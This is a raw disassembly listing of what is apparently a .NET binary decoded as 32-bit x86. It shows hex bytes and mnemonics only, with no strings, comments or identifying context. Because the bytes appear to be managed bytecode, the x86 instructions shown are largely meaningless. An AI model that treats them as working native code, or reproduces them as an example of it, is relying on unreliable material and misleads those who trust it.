  403610:	a2 a3 00 0b 0f       	mov    %al,0xf0b00a3
  403615:	00 00                	add    %al,(%eax)
  403617:	01 13                	add    %edx,(%ebx)
  403619:	30 02                	xor    %al,(%edx)
  40361b:	00 43 00             	add    %al,0x0(%ebx)
  40361e:	00 00                	add    %al,(%eax)
  403620:	11 00                	adc    %eax,(%eax)
  403622:	00 11                	add    %dl,(%ecx)
  403624:	00 28                	add    %ch,(%eax)
  403626:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403627:	00 00                	add    %al,(%eax)
  403629:	0a 0a                	or     (%edx),%cl
  40362b:	00 06                	add    %al,(%esi)
  40362d:	0b 16                	or     (%esi),%edx
  40362f:	0c 2b                	or     $0x2b,%al
  403631:	27                   	daa
  403632:	07                   	pop    %es
  403633:	08 9a 0d 00 09 6f    	or     %bl,0x6f09000d(%edx)
  403639:	a8 00                	test   $0x0,%al
  40363b:	00 0a                	add    %cl,(%edx)
  40363d:	02 6f a9             	add    -0x57(%edi),%ch
  403640:	00 00                	add    %al,(%eax)
  403642:	0a 28                	or     (%eax),%ch
  403644:	aa                   	stos   %al,%es:(%edi)
  403645:	00 00                	add    %al,(%eax)
  403647:	0a 13                	or     (%ebx),%dl
  403649:	04 11                	add    $0x11,%al
  40364b:	04 2c                	add    $0x2c,%al
  40364d:	06                   	push   %es
  40364e:	00 09                	add    %cl,(%ecx)
  403650:	13 05 2b 10 00 08    	adc    0x800102b,%eax
  403656:	17                   	pop    %ss
  403657:	58                   	pop    %eax
  403658:	0c 08                	or     $0x8,%al
  40365a:	07                   	pop    %es
  40365b:	8e 69 32             	mov    0x32(%ecx),%gs
  40365e:	d3 14 13             	rcll   %cl,(%ebx,%edx,1)
  403661:	05 2b 00 11 05       	add    $0x511002b,%eax
  403666:	2a 00                	sub    (%eax),%al
  403668:	1b 30                	sbb    (%eax),%esi
  40366a:	01 00                	add    %eax,(%eax)
  40366c:	16                   	push   %ss
	...
  403675:	00 20                	add    %ah,(%eax)
  403677:	03 00                	add    (%eax),%eax
  403679:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  40367f:	06                   	push   %es
  403680:	26 00 de             	es add %bl,%dh
  403683:	05 26 00 00 de       	add    $0xde000026,%eax
  403688:	00 2a                	add    %ch,(%edx)
  40368a:	00 00                	add    %al,(%eax)
  40368c:	01 10                	add    %edx,(%eax)
  40368e:	00 00                	add    %al,(%eax)
  403690:	00 00                	add    %al,(%eax)
  403692:	01 00                	add    %eax,(%eax)
  403694:	0f 10 00             	movups (%eax),%xmm0
  403697:	05 0f 00 00 01       	add    $0x100000f,%eax
  40369c:	1b 30                	sbb    (%eax),%esi
  40369e:	03 00                	add    (%eax),%eax
  4036a0:	42                   	inc    %edx
  4036a1:	00 00                	add    %al,(%eax)
  4036a3:	00 12                	add    %dl,(%edx)
  4036a5:	00 00                	add    %al,(%eax)
  4036a7:	11 00                	adc    %eax,(%eax)
  4036a9:	00 20                	add    %ah,(%eax)
  4036ab:	00 01                	add    %al,(%ecx)
  4036ad:	00 00                	add    %al,(%eax)
  4036af:	73 ab                	jae    0x40365c
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 0a                	or     (%edx),%cl
  4036b5:	28 38                	sub    %bh,(%eax)
  4036b7:	00 00                	add    %al,(%eax)
  4036b9:	06                   	push   %es
  4036ba:	0b 07                	or     (%edi),%eax
  4036bc:	06                   	push   %es
  4036bd:	20 00                	and    %al,(%eax)
  4036bf:	01 00                	add    %eax,(%eax)
  4036c1:	00 28                	add    %ch,(%eax)
  4036c3:	39 00                	cmp    %eax,(%eax)
  4036c5:	00 06                	add    %al,(%esi)
  4036c7:	16                   	push   %ss
  4036c8:	fe 02                	incb   (%edx)
  4036ca:	0c 08                	or     $0x8,%al
  4036cc:	2c 0a                	sub    $0xa,%al
  4036ce:	00 06                	add    %al,(%esi)
  4036d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4036d1:	33 00                	xor    (%eax),%eax
  4036d3:	00 0a                	add    %cl,(%edx)
  4036d5:	0d de 10 00 de       	or     $0xde0010de,%eax
  4036da:	05 26 00 00 de       	add    $0xde000026,%eax
  4036df:	00 72 e5             	add    %dh,-0x1b(%edx)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	70 0d                	jo     0x4036f3
  4036e6:	2b 00                	sub    (%eax),%eax
  4036e8:	09 2a                	or     %ebp,(%edx)
  4036ea:	00 00                	add    %al,(%eax)
  4036ec:	01 10                	add    %edx,(%eax)
  4036ee:	00 00                	add    %al,(%eax)
  4036f0:	00 00                	add    %al,(%eax)
  4036f2:	01 00                	add    %eax,(%eax)
  4036f4:	32 33                	xor    (%ebx),%dh
  4036f6:	00 05 0f 00 00 01    	add    %al,0x100000f
  4036fc:	13 30                	adc    (%eax),%esi
  4036fe:	03 00                	add    (%eax),%eax
  403700:	19 00                	sbb    %eax,(%eax)
  403702:	00 00                	add    %al,(%eax)
  403704:	0a 00                	or     (%eax),%al
  403706:	00 11                	add    %dl,(%ecx)
  403708:	00 16                	add    %dl,(%esi)
  40370a:	7e 08                	jle    0x403714
  40370c:	00 00                	add    %al,(%eax)
  40370e:	04 12                	add    $0x12,%al
  403710:	00 73 ac             	add    %dh,-0x54(%ebx)
  403713:	00 00                	add    %al,(%eax)
  403715:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  40371b:	06                   	push   %es
  40371c:	0b 2b                	or     (%ebx),%ebp
  40371e:	00 07                	add    %al,(%edi)
  403720:	2a 00                	sub    (%eax),%al
  403722:	00 00                	add    %al,(%eax)
  403724:	13 30                	adc    (%eax),%esi
  403726:	02 00                	add    (%eax),%al
  403728:	21 00                	and    %eax,(%eax)
  40372a:	00 00                	add    %al,(%eax)
  40372c:	02 00                	add    (%eax),%al
  40372e:	00 11                	add    %dl,(%ecx)
  403730:	00 7e 1e             	add    %bh,0x1e(%esi)
  403733:	00 00                	add    %al,(%eax)
  403735:	04 14                	add    $0x14,%al
  403737:	fe 03                	incb   (%ebx)
  403739:	0a 06                	or     (%esi),%al
  40373b:	2c 13                	sub    $0x13,%al
  40373d:	00 7e 1e             	add    %bh,0x1e(%esi)
  403740:	00 00                	add    %al,(%eax)
  403742:	04 6f                	add    $0x6f,%al
  403744:	ad                   	lods   %ds:(%esi),%eax
  403745:	00 00                	add    %al,(%eax)
  403747:	0a 00                	or     (%eax),%al
  403749:	14 80                	adc    $0x80,%al
  40374b:	1e                   	push   %ds
  40374c:	00 00                	add    %al,(%eax)
  40374e:	04 00                	add    $0x0,%al
  403750:	2a 00                	sub    (%eax),%al
  403752:	00 00                	add    %al,(%eax)
  403754:	13 30                	adc    (%eax),%esi
  403756:	01 00                	add    %eax,(%eax)
  403758:	20 00                	and    %al,(%eax)
  40375a:	00 00                	add    %al,(%eax)
  40375c:	02 00                	add    (%eax),%al
  40375e:	00 11                	add    %dl,(%ecx)
  403760:	00 7e 0f             	add    %bh,0xf(%esi)
  403763:	00 00                	add    %al,(%eax)
  403765:	04 28                	add    $0x28,%al
  403767:	13 00                	adc    (%eax),%eax
  403769:	00 0a                	add    %cl,(%edx)
  40376b:	2c 07                	sub    $0x7,%al
  40376d:	28 30                	sub    %dh,(%eax)
  40376f:	00 00                	add    %al,(%eax)
  403771:	06                   	push   %es
  403772:	2b 01                	sub    (%ecx),%eax
  403774:	16                   	push   %ss
  403775:	0a 06                	or     (%esi),%al
  403777:	2c 06                	sub    $0x6,%al
  403779:	28 40 00             	sub    %al,0x0(%eax)
  40377c:	00 06                	add    %al,(%esi)
  40377e:	00 2a                	add    %ch,(%edx)
  403780:	1b 30                	sbb    (%eax),%esi
  403782:	03 00                	add    (%eax),%eax
  403784:	2c 00                	sub    $0x0,%al
	...
  40378e:	14 fe                	adc    $0xfe,%al
  403790:	06                   	push   %es
  403791:	3e 00 00             	add    %al,%ds:(%eax)
  403794:	06                   	push   %es
  403795:	73 ae                	jae    0x403745
  403797:	00 00                	add    %al,(%eax)
  403799:	0a 28                	or     (%eax),%ch
  40379b:	af                   	scas   %es:(%edi),%eax
  40379c:	00 00                	add    %al,(%eax)
  40379e:	0a 00                	or     (%eax),%al
  4037a0:	28 b0 00 00 0a 00    	sub    %dh,0xa0000(%eax)
  4037a6:	17                   	pop    %ss
  4037a7:	16                   	push   %ss
  4037a8:	16                   	push   %ss
  4037a9:	28 3d 00 00 06 00    	sub    %bh,0x60000
  4037af:	00 de                	add    %bl,%dh
  4037b1:	05 26 00 00 de       	add    $0xde000026,%eax
  4037b6:	00 2a                	add    %ch,(%edx)
  4037b8:	01 10                	add    %edx,(%eax)
  4037ba:	00 00                	add    %al,(%eax)
  4037bc:	00 00                	add    %al,(%eax)
  4037be:	01 00                	add    %eax,(%eax)
  4037c0:	25 26 00 05 0f       	and    $0xf050026,%eax
  4037c5:	00 00                	add    %al,(%eax)
  4037c7:	01 1b                	add    %ebx,(%ebx)
  4037c9:	30 03                	xor    %al,(%ebx)
  4037cb:	00 24 00             	add    %ah,(%eax,%eax,1)
  4037ce:	00 00                	add    %al,(%eax)
  4037d0:	02 00                	add    (%eax),%al
  4037d2:	00 11                	add    %dl,(%ecx)
  4037d4:	00 00                	add    %al,(%eax)
  4037d6:	16                   	push   %ss
  4037d7:	16                   	push   %ss
  4037d8:	16                   	push   %ss
  4037d9:	28 3d 00 00 06 00    	sub    %bh,0x60000
  4037df:	00 de                	add    %bl,%dh
  4037e1:	15 26 00 2b 0d       	adc    $0xd2b0026,%eax
  4037e6:	00 20                	add    %ah,(%eax)
  4037e8:	a0 86 01 00 28       	mov    0x28000186,%al
  4037ed:	10 00                	adc    %al,(%eax)
  4037ef:	00 0a                	add    %cl,(%edx)
  4037f1:	00 00                	add    %al,(%eax)
  4037f3:	17                   	pop    %ss
  4037f4:	0a 2b                	or     (%ebx),%ch
  4037f6:	ef                   	out    %eax,(%dx)
  4037f7:	2a 01                	sub    (%ecx),%al
  4037f9:	10 00                	adc    %al,(%eax)
  4037fb:	00 00                	add    %al,(%eax)
  4037fd:	00 01                	add    %al,(%ecx)
  4037ff:	00 0d 0e 00 15 0f    	add    %cl,0xf15000e
  403805:	00 00                	add    %al,(%eax)
  403807:	01 1b                	add    %ebx,(%ebx)
  403809:	30 04 00             	xor    %al,(%eax,%eax,1)
  40380c:	44                   	inc    %esp
  40380d:	00 00                	add    %al,(%eax)
  40380f:	00 14 00             	add    %dl,(%eax,%eax,1)
  403812:	00 11                	add    %dl,(%ecx)
  403814:	00 00                	add    %al,(%eax)
  403816:	7e 65                	jle    0x40387d
  403818:	00 00                	add    %al,(%eax)
  40381a:	0a 7e 1f             	or     0x1f(%esi),%bh
  40381d:	00 00                	add    %al,(%eax)
  40381f:	04 18                	add    $0x18,%al
  403821:	6f                   	outsl  %ds:(%esi),(%dx)
  403822:	b1 00                	mov    $0x0,%cl
  403824:	00 0a                	add    %cl,(%edx)
  403826:	0a 00                	or     (%eax),%al
  403828:	06                   	push   %es
  403829:	02 03                	add    (%ebx),%al
  40382b:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  40382e:	00 00                	add    %al,(%eax)
  403830:	0a 00                	or     (%eax),%al
  403832:	17                   	pop    %ss
  403833:	0b de                	or     %esi,%ebx
  403835:	20 06                	and    %al,(%esi)
  403837:	2c 07                	sub    $0x7,%al
  403839:	06                   	push   %es
  40383a:	6f                   	outsl  %ds:(%esi),(%dx)
  40383b:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403840:	dc 0c 00             	fmull  (%eax,%eax,1)
  403843:	08 6f 75             	or     %ch,0x75(%edi)
  403846:	00 00                	add    %al,(%eax)
  403848:	0a 28                	or     (%eax),%ch
  40384a:	49                   	dec    %ecx
  40384b:	00 00                	add    %al,(%eax)
  40384d:	06                   	push   %es
  40384e:	00 00                	add    %al,(%eax)
  403850:	de 00                	fiadds (%eax)
  403852:	16                   	push   %ss
  403853:	0b 2b                	or     (%ebx),%ebp
  403855:	00 07                	add    %al,(%edi)
  403857:	2a 01                	sub    (%ecx),%al
  403859:	1c 00                	sbb    $0x0,%al
  40385b:	00 02                	add    %al,(%edx)
  40385d:	00 13                	add    %dl,(%ebx)
  40385f:	00 0f                	add    %cl,(%edi)
  403861:	22 00                	and    (%eax),%al
  403863:	0b 00                	or     (%eax),%eax
  403865:	00 00                	add    %al,(%eax)
  403867:	00 00                	add    %al,(%eax)
  403869:	00 01                	add    %al,(%ecx)
  40386b:	00 2c 2d 00 11 12 00 	add    %ch,0x121100(,%ebp,1)
  403872:	00 01                	add    %al,(%ecx)
  403874:	1b 30                	sbb    (%eax),%esi
  403876:	02 00                	add    (%eax),%al
  403878:	46                   	inc    %esi
  403879:	00 00                	add    %al,(%eax)
  40387b:	00 15 00 00 11 00    	add    %dl,0x110000
  403881:	00 7e 65             	add    %bh,0x65(%esi)
  403884:	00 00                	add    %al,(%eax)
  403886:	0a 7e 1f             	or     0x1f(%esi),%bh
  403889:	00 00                	add    %al,(%eax)
  40388b:	04 6f                	add    $0x6f,%al
  40388d:	b3 00                	mov    $0x0,%bl
  40388f:	00 0a                	add    %cl,(%edx)
  403891:	0a 00                	or     (%eax),%al
  403893:	06                   	push   %es
  403894:	02 6f b4             	add    -0x4c(%edi),%ch
  403897:	00 00                	add    %al,(%eax)
  403899:	0a 0b                	or     (%ebx),%cl
  40389b:	07                   	pop    %es
  40389c:	74 02                	je     0x4038a0
  40389e:	00 00                	add    %al,(%eax)
  4038a0:	1b 0c de             	sbb    (%esi,%ebx,8),%ecx
  4038a3:	20 06                	and    %al,(%esi)
  4038a5:	2c 07                	sub    $0x7,%al
  4038a7:	06                   	push   %es
  4038a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4038a9:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4038ae:	dc 0d 00 09 6f 75    	fmull  0x756f0900
  4038b4:	00 00                	add    %al,(%eax)
  4038b6:	0a 28                	or     (%eax),%ch
  4038b8:	49                   	dec    %ecx
  4038b9:	00 00                	add    %al,(%eax)
  4038bb:	06                   	push   %es
  4038bc:	00 00                	add    %al,(%eax)
  4038be:	de 00                	fiadds (%eax)
  4038c0:	14 0c                	adc    $0xc,%al
  4038c2:	2b 00                	sub    (%eax),%eax
  4038c4:	08 2a                	or     %ch,(%edx)
  4038c6:	00 00                	add    %al,(%eax)
  4038c8:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4038cb:	00 02                	add    %al,(%edx)
  4038cd:	00 12                	add    %dl,(%edx)
  4038cf:	00 12                	add    %dl,(%edx)
  4038d1:	24 00                	and    $0x0,%al
  4038d3:	0b 00                	or     (%eax),%eax
  4038d5:	00 00                	add    %al,(%eax)
  4038d7:	00 00                	add    %al,(%eax)
  4038d9:	00 01                	add    %al,(%ecx)
  4038db:	00 2e                	add    %ch,(%esi)
  4038dd:	2f                   	das
  4038de:	00 11                	add    %dl,(%ecx)
  4038e0:	12 00                	adc    (%eax),%al
  4038e2:	00 01                	add    %al,(%ecx)
  4038e4:	1b 30                	sbb    (%eax),%esi
  4038e6:	02 00                	add    (%eax),%al
  4038e8:	41                   	inc    %ecx
  4038e9:	00 00                	add    %al,(%eax)
  4038eb:	00 14 00             	add    %dl,(%eax,%eax,1)
  4038ee:	00 11                	add    %dl,(%ecx)
  4038f0:	00 00                	add    %al,(%eax)
  4038f2:	7e 65                	jle    0x403959
  4038f4:	00 00                	add    %al,(%eax)
  4038f6:	0a 7e 1f             	or     0x1f(%esi),%bh
  4038f9:	00 00                	add    %al,(%eax)
  4038fb:	04 6f                	add    $0x6f,%al
  4038fd:	b3 00                	mov    $0x0,%bl
  4038ff:	00 0a                	add    %cl,(%edx)
  403901:	0a 00                	or     (%eax),%al
  403903:	06                   	push   %es
  403904:	02 6f b5             	add    -0x4b(%edi),%ch
  403907:	00 00                	add    %al,(%eax)
  403909:	0a 00                	or     (%eax),%al
  40390b:	17                   	pop    %ss
  40390c:	0b de                	or     %esi,%ebx
  40390e:	20 06                	and    %al,(%esi)
  403910:	2c 07                	sub    $0x7,%al
  403912:	06                   	push   %es
  403913:	6f                   	outsl  %ds:(%esi),(%dx)
  403914:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403919:	dc 0c 00             	fmull  (%eax,%eax,1)
  40391c:	08 6f 75             	or     %ch,0x75(%edi)
  40391f:	00 00                	add    %al,(%eax)
  403921:	0a 28                	or     (%eax),%ch
  403923:	49                   	dec    %ecx
  403924:	00 00                	add    %al,(%eax)
  403926:	06                   	push   %es
  403927:	00 00                	add    %al,(%eax)
  403929:	de 00                	fiadds (%eax)
  40392b:	16                   	push   %ss
  40392c:	0b 2b                	or     (%ebx),%ebp
  40392e:	00 07                	add    %al,(%edi)
  403930:	2a 00                	sub    (%eax),%al
  403932:	00 00                	add    %al,(%eax)
  403934:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403937:	00 02                	add    %al,(%edx)
  403939:	00 12                	add    %dl,(%edx)
  40393b:	00 0d 1f 00 0b 00    	add    %cl,0xb001f
  403941:	00 00                	add    %al,(%eax)
  403943:	00 00                	add    %al,(%eax)
  403945:	00 01                	add    %al,(%ecx)
  403947:	00 29                	add    %ch,(%ecx)
  403949:	2a 00                	sub    (%eax),%al
  40394b:	11 12                	adc    %edx,(%edx)
  40394d:	00 00                	add    %al,(%eax)
  40394f:	01 1b                	add    %ebx,(%ebx)
  403951:	30 03                	xor    %al,(%ebx)
  403953:	00 46 00             	add    %al,0x0(%esi)
  403956:	00 00                	add    %al,(%eax)
  403958:	14 00                	adc    $0x0,%al
  40395a:	00 11                	add    %dl,(%ecx)
  40395c:	00 00                	add    %al,(%eax)
  40395e:	7e 65                	jle    0x4039c5
  403960:	00 00                	add    %al,(%eax)
  403962:	0a 72 e5             	or     -0x1b(%edx),%dh
  403965:	00 00                	add    %al,(%eax)
  403967:	70 17                	jo     0x403980
  403969:	6f                   	outsl  %ds:(%esi),(%dx)
  40396a:	b6 00                	mov    $0x0,%dh
  40396c:	00 0a                	add    %cl,(%edx)
  40396e:	0a 00                	or     (%eax),%al
  403970:	06                   	push   %es
  403971:	7e 1f                	jle    0x403992
  403973:	00 00                	add    %al,(%eax)
  403975:	04 6f                	add    $0x6f,%al
  403977:	b7 00                	mov    $0x0,%bh
  403979:	00 0a                	add    %cl,(%edx)
  40397b:	00 17                	add    %dl,(%edi)
  40397d:	0b de                	or     %esi,%ebx
  40397f:	20 06                	and    %al,(%esi)
  403981:	2c 07                	sub    $0x7,%al
  403983:	06                   	push   %es
  403984:	6f                   	outsl  %ds:(%esi),(%dx)
  403985:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40398a:	dc 0c 00             	fmull  (%eax,%eax,1)
  40398d:	08 6f 75             	or     %ch,0x75(%edi)
  403990:	00 00                	add    %al,(%eax)
  403992:	0a 28                	or     (%eax),%ch
  403994:	49                   	dec    %ecx
  403995:	00 00                	add    %al,(%eax)
  403997:	06                   	push   %es
  403998:	00 00                	add    %al,(%eax)
  40399a:	de 00                	fiadds (%eax)
  40399c:	16                   	push   %ss
  40399d:	0b 2b                	or     (%ebx),%ebp
  40399f:	00 07                	add    %al,(%edi)
  4039a1:	2a 00                	sub    (%eax),%al
  4039a3:	00 01                	add    %al,(%ecx)
  4039a5:	1c 00                	sbb    $0x0,%al
  4039a7:	00 02                	add    %al,(%edx)
  4039a9:	00 13                	add    %dl,(%ebx)
  4039ab:	00 11                	add    %dl,(%ecx)
  4039ad:	24 00                	and    $0x0,%al
  4039af:	0b 00                	or     (%eax),%eax
  4039b1:	00 00                	add    %al,(%eax)
  4039b3:	00 00                	add    %al,(%eax)
  4039b5:	00 01                	add    %al,(%ecx)
  4039b7:	00 2e                	add    %ch,(%esi)
  4039b9:	2f                   	das
  4039ba:	00 11                	add    %dl,(%ecx)
  4039bc:	12 00                	adc    (%eax),%al
  4039be:	00 01                	add    %al,(%ecx)
  4039c0:	56                   	push   %esi
  4039c1:	72 df                	jb     0x4039a2
  4039c3:	05 00 70 7e 10       	add    $0x107e7000,%eax
  4039c8:	00 00                	add    %al,(%eax)
  4039ca:	04 28                	add    $0x28,%al
  4039cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4039cd:	00 00                	add    %al,(%eax)
  4039cf:	0a 80 1f 00 00 04    	or     0x400001f(%eax),%al
  4039d5:	2a 00                	sub    (%eax),%al
  4039d7:	00 1b                	add    %bl,(%ebx)
  4039d9:	30 03                	xor    %al,(%ebx)
  4039db:	00 10                	add    %dl,(%eax)
  4039dd:	02 00                	add    (%eax),%al
  4039df:	00 16                	add    %dl,(%esi)
  4039e1:	00 00                	add    %al,(%eax)
  4039e3:	11 00                	adc    %eax,(%eax)
  4039e5:	00 73 4d             	add    %dh,0x4d(%ebx)
  4039e8:	00 00                	add    %al,(%eax)
  4039ea:	0a 0a                	or     (%edx),%cl
  4039ec:	06                   	push   %es
  4039ed:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  4039f1:	00 1b                	add    %bl,(%ebx)
  4039f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f4:	b8 00 00 0a 00       	mov    $0xa0000,%eax
  4039f9:	06                   	push   %es
  4039fa:	72 7b                	jb     0x403a77
  4039fc:	01 00                	add    %eax,(%eax)
  4039fe:	70 6f                	jo     0x403a6f
  403a00:	4e                   	dec    %esi
  403a01:	00 00                	add    %al,(%eax)
  403a03:	0a 6f b9             	or     -0x47(%edi),%ch
  403a06:	00 00                	add    %al,(%eax)
  403a08:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403a0b:	0b 07                	or     (%edi),%eax
  403a0d:	72 f3                	jb     0x403a02
  403a0f:	05 00 70 28 1f       	add    $0x1f287000,%eax
  403a14:	00 00                	add    %al,(%eax)
  403a16:	0a 2d 22 07 72 fd    	or     0xfd720722,%ch
  403a1c:	05 00 70 28 1f       	add    $0x1f287000,%eax
  403a21:	00 00                	add    %al,(%eax)
  403a23:	0a 2d 68 07 72 0b    	or     0xb720768,%ch
  403a29:	06                   	push   %es
  403a2a:	00 70 28             	add    %dh,0x28(%eax)
  403a2d:	1f                   	pop    %ds
  403a2e:	00 00                	add    %al,(%eax)
  403a30:	0a 3a                	or     (%edx),%bh
  403a32:	f7 00 00 00 38 a2    	testl  $0xa2380000,(%eax)
  403a38:	01 00                	add    %eax,(%eax)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	16                   	push   %ss
  403a3d:	28 1a                	sub    %bl,(%edx)
  403a3f:	00 00                	add    %al,(%eax)
  403a41:	06                   	push   %es
  403a42:	00 73 4d             	add    %dh,0x4d(%ebx)
  403a45:	00 00                	add    %al,(%eax)
  403a47:	0a 0d 09 72 7b 01    	or     0x17b7209,%cl
  403a4d:	00 70 6f             	add    %dh,0x6f(%eax)
  403a50:	4e                   	dec    %esi
  403a51:	00 00                	add    %al,(%eax)
  403a53:	0a 72 f3             	or     -0xd(%edx),%dh
  403a56:	05 00 70 6f ba       	add    $0xba6f7000,%eax
  403a5b:	00 00                	add    %al,(%eax)
  403a5d:	0a 00                	or     (%eax),%al
  403a5f:	09 72 93             	or     %esi,-0x6d(%edx)
  403a62:	01 00                	add    %eax,(%eax)
  403a64:	70 6f                	jo     0x403ad5
  403a66:	4e                   	dec    %esi
  403a67:	00 00                	add    %al,(%eax)
  403a69:	0a 28                	or     (%eax),%ch
  403a6b:	17                   	pop    %ss
  403a6c:	00 00                	add    %al,(%eax)
  403a6e:	06                   	push   %es
  403a6f:	6a 6f                	push   $0x6f
  403a71:	bb 00 00 0a 00       	mov    $0xa0000,%ebx
  403a76:	09 6f 50             	or     %ebp,0x50(%edi)
  403a79:	00 00                	add    %al,(%eax)
  403a7b:	0a 28                	or     (%eax),%ch
  403a7d:	20 00                	and    %al,(%eax)
  403a7f:	00 06                	add    %al,(%esi)
  403a81:	00 16                	add    %dl,(%esi)
  403a83:	28 18                	sub    %bl,(%eax)
  403a85:	00 00                	add    %al,(%eax)
  403a87:	06                   	push   %es
  403a88:	00 38                	add    %bh,(%eax)
  403a8a:	4f                   	dec    %edi
  403a8b:	01 00                	add    %eax,(%eax)
  403a8d:	00 00                	add    %al,(%eax)
  403a8f:	00 06                	add    %al,(%esi)
  403a91:	72 21                	jb     0x403ab4
  403a93:	06                   	push   %es
  403a94:	00 70 6f             	add    %dh,0x6f(%eax)
  403a97:	4e                   	dec    %esi
  403a98:	00 00                	add    %al,(%eax)
  403a9a:	0a 6f b9             	or     -0x47(%edi),%ch
  403a9d:	00 00                	add    %al,(%eax)
  403a9f:	0a 28                	or     (%eax),%ch
  403aa1:	42                   	inc    %edx
  403aa2:	00 00                	add    %al,(%eax)
  403aa4:	06                   	push   %es
  403aa5:	14 fe                	adc    $0xfe,%al
  403aa7:	01 13                	add    %edx,(%ebx)
  403aa9:	04 11                	add    $0x11,%al
  403aab:	04 2c                	add    $0x2c,%al
  403aad:	5d                   	pop    %ebp
  403aae:	00 7e 20             	add    %bh,0x20(%esi)
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	04 06                	add    $0x6,%al
  403ab5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ab6:	bc 00 00 0a 00       	mov    $0xa0000,%esp
  403abb:	73 4d                	jae    0x403b0a
  403abd:	00 00                	add    %al,(%eax)
  403abf:	0a 13                	or     (%ebx),%dl
  403ac1:	05 11 05 72 7b       	add    $0x7b720511,%eax
  403ac6:	01 00                	add    %eax,(%eax)
  403ac8:	70 6f                	jo     0x403b39
  403aca:	4e                   	dec    %esi
  403acb:	00 00                	add    %al,(%eax)
  403acd:	0a 72 29             	or     0x29(%edx),%dh
  403ad0:	06                   	push   %es
  403ad1:	00 70 6f             	add    %dh,0x6f(%eax)
  403ad4:	ba 00 00 0a 00       	mov    $0xa0000,%edx
  403ad9:	11 05 72 3f 06 00    	adc    %eax,0x63f72
  403adf:	70 6f                	jo     0x403b50
  403ae1:	4e                   	dec    %esi
  403ae2:	00 00                	add    %al,(%eax)
  403ae4:	0a 06                	or     (%esi),%al
  403ae6:	72 21                	jb     0x403b09
  403ae8:	06                   	push   %es
  403ae9:	00 70 6f             	add    %dh,0x6f(%eax)
  403aec:	4e                   	dec    %esi
  403aed:	00 00                	add    %al,(%eax)
  403aef:	0a 6f b9             	or     -0x47(%edi),%ch
  403af2:	00 00                	add    %al,(%eax)
  403af4:	0a 6f ba             	or     -0x46(%edi),%ch
  403af7:	00 00                	add    %al,(%eax)
  403af9:	0a 00                	or     (%eax),%al
  403afb:	11 05 6f 50 00 00    	adc    %eax,0x506f
  403b01:	0a 28                	or     (%eax),%ch
  403b03:	20 00                	and    %al,(%eax)
  403b05:	00 06                	add    %al,(%esi)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	2b 07                	sub    (%edi),%eax
  403b0b:	06                   	push   %es
  403b0c:	28 47 00             	sub    %al,0x0(%edi)
  403b0f:	00 06                	add    %al,(%esi)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	de 13                	ficoms (%ebx)
  403b15:	13 06                	adc    (%esi),%eax
  403b17:	00 11                	add    %dl,(%ecx)
  403b19:	06                   	push   %es
  403b1a:	6f                   	outsl  %ds:(%esi),(%dx)
  403b1b:	75 00                	jne    0x403b1d
  403b1d:	00 0a                	add    %cl,(%edx)
  403b1f:	28 49 00             	sub    %cl,0x0(%ecx)
  403b22:	00 06                	add    %al,(%esi)
  403b24:	00 00                	add    %al,(%eax)
  403b26:	de 00                	fiadds (%eax)
  403b28:	38 b0 00 00 00 00    	cmp    %dh,0x0(%eax)
  403b2e:	06                   	push   %es
  403b2f:	72 4d                	jb     0x403b7e
  403b31:	06                   	push   %es
  403b32:	00 70 6f             	add    %dh,0x6f(%eax)
  403b35:	4e                   	dec    %esi
  403b36:	00 00                	add    %al,(%eax)
  403b38:	0a 6f b9             	or     -0x47(%edi),%ch
  403b3b:	00 00                	add    %al,(%eax)
  403b3d:	0a 06                	or     (%esi),%al
  403b3f:	72 21                	jb     0x403b62
  403b41:	06                   	push   %es
  403b42:	00 70 6f             	add    %dh,0x6f(%eax)
  403b45:	4e                   	dec    %esi
  403b46:	00 00                	add    %al,(%eax)
  403b48:	0a 6f bd             	or     -0x43(%edi),%ch
  403b4b:	00 00                	add    %al,(%eax)
  403b4d:	0a 28                	or     (%eax),%ch
  403b4f:	41                   	inc    %ecx
  403b50:	00 00                	add    %al,(%eax)
  403b52:	06                   	push   %es
  403b53:	26 72 57             	es jb  0x403bad
  403b56:	06                   	push   %es
  403b57:	00 70 28             	add    %dh,0x28(%eax)
  403b5a:	2e 00 00             	add    %al,%cs:(%eax)
  403b5d:	0a 00                	or     (%eax),%al
  403b5f:	00 7e 20             	add    %bh,0x20(%esi)
  403b62:	00 00                	add    %al,(%eax)
  403b64:	04 28                	add    $0x28,%al
  403b66:	01 00                	add    %eax,(%eax)
  403b68:	00 2b                	add    %ch,(%ebx)
  403b6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403b6b:	bf 00 00 0a 13       	mov    $0x130a0000,%edi
  403b70:	07                   	pop    %es
  403b71:	2b 4e 12             	sub    0x12(%esi),%ecx
  403b74:	07                   	pop    %es
  403b75:	28 c0                	sub    %al,%al
  403b77:	00 00                	add    %al,(%eax)
  403b79:	0a 13                	or     (%ebx),%dl
  403b7b:	08 00                	or     %al,(%eax)
  403b7d:	11 08                	adc    %ecx,(%eax)
  403b7f:	72 21                	jb     0x403ba2
  403b81:	06                   	push   %es
  403b82:	00 70 6f             	add    %dh,0x6f(%eax)
  403b85:	4e                   	dec    %esi
  403b86:	00 00                	add    %al,(%eax)
  403b88:	0a 6f b9             	or     -0x47(%edi),%ch
  403b8b:	00 00                	add    %al,(%eax)
  403b8d:	0a 06                	or     (%esi),%al
  403b8f:	72 4d                	jb     0x403bde
  403b91:	06                   	push   %es
